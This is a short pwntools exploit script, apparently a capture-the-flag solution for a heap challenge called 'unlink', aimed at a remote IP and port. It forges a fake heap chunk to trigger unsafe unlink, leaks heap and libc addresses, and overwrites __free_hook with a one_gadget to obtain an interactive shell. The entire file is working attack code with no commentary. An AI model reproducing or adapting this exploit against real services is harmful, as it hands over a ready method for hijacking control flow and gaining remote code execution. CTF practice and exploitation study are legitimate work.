from pwn import *

#p = process(['./unlink'],env={'LD_PRELOAD':'./libc.so.6'},aslr='FALSE')
p = remote("124.16.75.162", 31053)
#libc = ELF("./libc.so.6")

def new(idx, data):
	p.recvuntil("your choise:\n")
	p.send("1\n")
	p.recvuntil("index:")
	p.sendline(str(idx))
	p.recvuntil("plz input content:\n")
	p.send(data)

def edit(idx, data):
	p.recvuntil("your choise:\n")
	p.send("2\n")
	p.recvuntil("index:")
	p.sendline(str(idx))
	p.recvuntil("plz input content:")
	p.send(data)

def show(idx):
	p.recvuntil("your choise:\n")
	p.send("3\n")
	p.recvuntil("index:")
	p.sendline(str(idx))

def free(idx):
	p.recvuntil("your choise:\n")
	p.send("4\n")
	p.recvuntil("index:")
	p.sendline(str(idx))

def main():
	context.log_level = "debug"
	one_gadget = 0x4527a
	free_hook = 0x3c67a8
	malloc_hook = 0x3c4b10
	bss_addr = 0x6020e0 #very important	

	#gdb.attach(p, "b main")
	new(0, "AAAA\n")
	new(1, "BBBB\n")
	new(2, "CCCC\n")
	new(3, "DDDD\n")
	new(4, p64(0xa0) + p64(0x31) + p64(bss_addr - 0x18) + p64(bss_addr - 0x10)) # fake_chunk start here
	new(5, p64(0x30) + p64(0x30)) # chunk to be free to cause unlink
	
	free(1)
	free(0)
	show(0)
	chunk1_addr = u64((p.readuntil('\n')[:-1]).ljust(8,chr(0x0)))
	heap_addr = chunk1_addr - 0x30
	print "Heap_base_addr:",hex(heap_addr)


	edit(0, p64(heap_addr + 0x20) + p64(0) + p64(0) + p64(0x31))
	new(6, p64(0) + p64(0xa1)) #chunk 0
	#pause()
	new(7, 'A'*8 + p64(0xa1)) #chunk 1
	#pause()
	free(1)
	show(1) #leak_libc_addr
	#<main_arena+88> addr-0x3cb20-88=addr-0x3c4b78
	libc_base = u64(p.recvline()[ : -1].ljust(8, '\x00'))-0x3c4b78
	print "libc_base_addr:",hex(libc_base)
	#pause()
	edit(4,p64(libc_base + free_hook)) #free_hook
	#pause()
	edit(1, p64(libc_base + one_gadget)[:-1])#
	free(1)
	
	p.interactive()
	

if  __name__ == "__main__":
	main()
	
